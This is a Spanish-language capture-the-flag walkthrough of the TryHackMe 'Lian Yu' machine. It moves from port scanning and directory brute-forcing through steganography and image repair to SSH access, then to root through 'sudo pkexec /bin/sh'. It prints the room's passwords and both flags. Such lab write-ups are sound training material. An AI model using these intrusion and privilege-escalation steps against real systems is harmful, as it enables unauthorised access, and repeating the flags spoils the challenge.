# Writeup Lian Yu - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | 10.130.165.75 |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Dificultad** | Fácil |

---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Flags](#flags)

---

## Reconocimiento

Lo primero que vamos a hacer, es un escaneo inicial de puertos, para saber que tenemos entre nuestras manos:


```bash
sudo nmap -sC -sV -Pn -sS -p- 10.130.165.75 -oN scan_lian_yu.txt
```



### Resultados del Escaneo


```bash
Nmap scan report for 10.130.165.75
Host is up (0.054s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp    open  http    Apache httpd
111/tcp   open  rpcbind 2-4 (RPC #100000)
45083/tcp open  status  1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.57 seconds
```

Podemos ver que hay 4 puertos abiertos en la máquina, FTP, SSH, HTTP y RPC. Vamos a mirar que hay en el sitio web para ver por donde va los tiros.

![pagina principal](/imgLianYu/image.png)


---

## Enumeración

Tiene pinta de ser una página sobre una isla del mismo nombre del universo DC, nada del otro mundo. Vamos a usar GoBuster para ver si hay algo oculto.

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://[IP_ADDRESS]
```

![resultado gobuster](/imgLianYu/image2.png)

Interesante. Hay un directorio web llamado Island. Vamos a acceder a dicha carpeta para ver lo que hay.

![carpeta island](/imgLianYu/image3.png)

Hmm, al parecer hay que buscar el "Lian_Yu", y se supone que nos da una contraseña secreta. Vamos a revisar el código de la página por si acaso.

![codigo secreto](/imgLianYu/image4.png)

¡Bingo! Tenemos la clave secreta. Pero de momento no nos sirve de nada, pero vamos a seguir buscando. Vamos a reiniciar el GoBuster desde la misma carpeta para ver si hay algo interesante.

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://10.130.165.75/island/
```

![resultado gobuster 2](/imgLianYu/image5.png)

Interesante. Hay otro directorio oculto. Vamos a revisarlo para ver que nos encontramos.

![carpeta oculta](/imgLianYu/image6.png)

Al parecer, se supone que habría un vídeo de YouTube que mostraría algo, pero al parecer ya no está disponible. Vamos a mirar el código web para ver si hay algo oculto.

![codigo web](/imgLianYu/image7.png)

Vale, hay un comentario web que pone "you can avail your .ticket here but how?", por lo que vamos a intentar buscar con GoBuster a partir de la carpeta esa usando el formato .ticket

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://10.130.165.75/island/2100 -x ticket
```

![resultado gobuster 3](/imgLianYu/image8.png)

¡Ojito! Hemos encontrado un ticket llamado "green_arrow.ticket", vamos a revisarlo para ver que nos encontramos.

![ticket](/imgLianYu/image9.png)

Interesante, es un token de acceso a la máquina, pero ¿de que servicio? Vamos a decodificar el código usando CyberChef para ver con lo que vamos.

![cyberchef](/imgLianYu/image10.png)

¡Perfecto! Tenemos la contraseña de acceso a uno de los servicios de la máquina. Vamos a probar a prueba y error. ¡Un momento! ¿No será que el código de "vigilante" de antes es el usuario y contraseña a uno de los servicios?

```bash
tp 10.130.165.75
Connected to 10.130.165.75.
220 (vsFTPd 3.0.2)
Name (10.130.165.75:kali): vigilante
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||35189|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
```
¡Dicho y hecho! Tenemos acceso al servicio FTP de la máquina. Vamos a descargar las imágenes para analizarlas tranquilamente.

Al descargar las imágenes y revisarlas, parecen que no tiene nada fuera de lo común (aunque me llama la atención que Leave_Me_Alone.png no muestre sus contenidos), pero vamos a usar steghide para ver si hay algo oculto.

```bash
steghide extract -sf Leave_me_alone.png
```
Vale, no hemos encontrado nada, por lo que vamos a editar la imagen para "repararla" y conseguir la contraseña del usuario SSH. Para ello usaremos HexEditor y pondremos la siguiente secuencia al principio del texto:

![hexeditor](/imgLianYu/image11.png)

Y ya con la secuencia correcta (buscando en Google Magic numbers y yendo a https://en.wikipedia.org/wiki/List_of_file_signatures) nos encontraremos con esto:

![resultado reparacion](/imgLianYu/image12.png)

¡Perfecto! Ya tendriamos la contraseña para el archivo "aa.jpg", vamos a usar steghide para extraerlo.

```bash
steghide extract -sf aa.jpg
Enter passphrase: 
wrote extracted data to "ss.zip".
```
Vale, al parecer tenemos un .zip dentro de la imagen, vamos a descomprimirlo para ver que hay.

![contenido zip](/imgLianYu/image13.png)

Vale, hay dos archivos .txt, uno es sobre un tal Oliver y otro que da la contraseña al usuario SSH

```text
*passwd.txt*
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
```

```text
*shado*
M3tahuman
```

¡Perfecto! Ya tendriamos la contraseña para el usuario SSH, Pero aún no estamos dentro, ya que nos falta el usuario. Vamos a volver a FTP para ver que hay de nuevo.

```bash
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||14726|).
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 May 01  2020 slade
drwxr-xr-x    2 1001     1001         4096 May 05  2020 vigilante
226 Directory send OK.
```



[ANÁLISIS]

---

## Explotación

¡Ojito! Tenemos un usuario llamado "slade", vamos a intentar entrar por SSH.

```bash
ssh slade@[IP_ADDRESS]
```

¡Perfecto! Ya estamos dentro de la máquina. Ahora vamos a buscar la flag de usuario.

```bash
slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt 
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
                        --Felicity Smoak
```
---

## Escalada de Privilegios

Ya que estamos como usuario, vamos a buscar la forma de aumentar privilegios dentro de la máquina. Vamos a ejecutar `sudo -l` para ver que podemos ejecutar sin contraseña.

```bash
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```
Vale, podemos ejecutar pkexec como root. Vamos a buscar en GTFOBins para ver si podemos escalar de privilegios.

![gtfobins](/imgLianYu/image14.png)

Vale, tenemos un comando para probar. Vamos a ejecutarlo y a ver que pasa.

```bash
sudo pkexec /bin/sh
```

¡Perfecto! Tenemos acceso como root. Vamos a recuperar la flag y ya habremos terminado.

```bash
slade@LianYu:~$ sudo pkexec /bin/sh
# whoami
root
# cat /root/root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE
```
---

## Flags

- **User Flag**: THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
- **Root Flag**: THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
